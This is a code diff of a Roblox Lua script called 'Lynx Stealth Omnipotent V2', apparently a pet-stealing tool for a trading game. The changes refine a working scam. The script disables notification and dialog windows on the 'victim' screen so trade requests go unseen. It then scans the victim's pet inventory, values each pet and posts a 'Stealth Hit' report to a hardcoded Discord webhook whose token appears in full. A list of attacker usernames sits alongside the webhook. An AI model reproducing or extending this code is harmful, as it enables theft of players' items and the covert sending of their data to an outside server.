@@ -1,9 +1,9 @@
--- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - STEALTH OMNIPOTENT V2 ]] --
+-- [[ LYNX STEALTH OMNIPOTENT V2 - DELTA STABLE ]] --
 
 -- [[ BOT GENERATED CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
 local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-local THRESHOLD = 0.13 -- Pets strictly below this value are ignored in trades and webhooks
+local THRESHOLD = 0.13 -- Strictly ignore pets below this value
 
 -- 1. INITIALIZATION & STEALTH UI
 local Players = game:GetService("Players")
@@ -11,18 +11,21 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- Stealth Mode: Kills notifications and dialog boxes on Victim Screen
+-- Stealth Mode: Kills notifications and dialog boxes on Victim Screen immediately
 local function applyStealth()
     pcall(function()
         local gui = LocalPlayer:WaitForChild("PlayerGui")
-        -- Hiding these prevents the victim from seeing the "Trade Request Sent" / "Cooldown" spam
-        if gui:FindFirstChild("NotificationApp") then gui.NotificationApp.Enabled = false end
-        if gui:FindFirstChild("DialogApp") then gui.DialogApp.Enabled = false end
+        local notificationApp = gui:WaitForChild("NotificationApp", 5)
+        local dialogApp = gui:WaitForChild("DialogApp", 5)
+        
+        if notificationApp then notificationApp.Enabled = false end
+        if dialogApp then dialogApp.Enabled = false end
         if gui:FindFirstChild("HintApp") then gui.HintApp:Destroy() end
     end)
 end
 applyStealth()
 
+-- Wait for player and critical GUI components
 while not LocalPlayer or not LocalPlayer:FindFirstChild("PlayerGui") do 
     task.wait(0.5) 
     LocalPlayer = Players.LocalPlayer 
@@ -46,9 +49,8 @@ local function hashedAPI(remoteName, ...)
     elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
 end
 
--- 3. VALUATION & FILTERING (AMVGG Sided)
+-- 3. VALUATION & FILTERING (Pure AMVGG Sided)
 local PetBaseValues = {}
--- Untradable Blacklist (Starter dogs/cats, Jerboas, Minigames)
 local untradableKeywords = {"starter", "jerboa", "minigame", "practice", "egg_starter"}
 
 local function isTradeable(id)
@@ -59,7 +61,7 @@ local function isTradeable(id)
     return true
 end
 
--- Custom Value Scaling (True value, NO fixed floor)
+-- Mondeur's Pesos Scaling Logic
 local function getScaledValue(rawValue)
     if not rawValue or rawValue <= 0 then return 0 end
     local val = rawValue * 10
@@ -77,7 +79,7 @@ local function getMutationBonus(p)
     return bonus
 end
 
--- Custom Emoji Rules
+-- Custom Emojis for Lynx V2
 local function getEmoji(p)
     local emojis = ""
     if p.mega_neon or p.mega then emojis = emojis .. "Ⓜ️"
@@ -99,14 +101,14 @@ pcall(function()
     end
 end)
 
--- 4. INVENTORY SCAN (Clean Multipliers & Strict Threshold)
+-- 4. INVENTORY PROCESSING
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
 
 local function processInventory()
     local inv = ClientData.get("inventory")
-    local rawPets = inv.pets or {}
+    local rawPets = inv and inv.pets or {}
     local grouped = {}
     local totalWorth = 0
 
@@ -117,13 +119,11 @@ local function processInventory()
             local mutations = pet.properties or {}
             local rawVal = PetBaseValues[name] or 0.01
             
-            -- Use true scaled value + mutation bonuses
             local individualValue = getScaledValue(rawVal) + getMutationBonus(mutations)
             
             -- STRICT THRESHOLD FILTER
             if individualValue >= THRESHOLD then
                 totalWorth = totalWorth + individualValue
-                -- Unique key to combine exact duplicates (e.g., Ghost Wolf MFR goes with Ghost Wolf MFR)
                 local key = name .. (mutations.mega_neon and "M" or "") .. (mutations.neon and "N" or "") .. (mutations.flyable and "F" or "") .. (mutations.rideable and "R" or "")
                 
                 if not grouped[key] then
@@ -151,7 +151,6 @@ end
 
 -- 5. WEBHOOK EXECUTION
 local petList, totalValue = processInventory()
--- Ping if total value of tradeable items hits your threshold target
 local pingStatus = totalValue >= (THRESHOLD * 10) 
 
 local function sendHit()
@@ -165,5 +164,5 @@ local function sendHit()
     local payload = {
         content = pingStatus and "@everyone Hit threshold reached!" or "",
         embeds = {{
-            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ꜱᴛᴇᴀʟᴛʜ ʜɪᴛ ﹒˚₊꒱",
+            title = "Lynx Stealth Hit",
             description = "
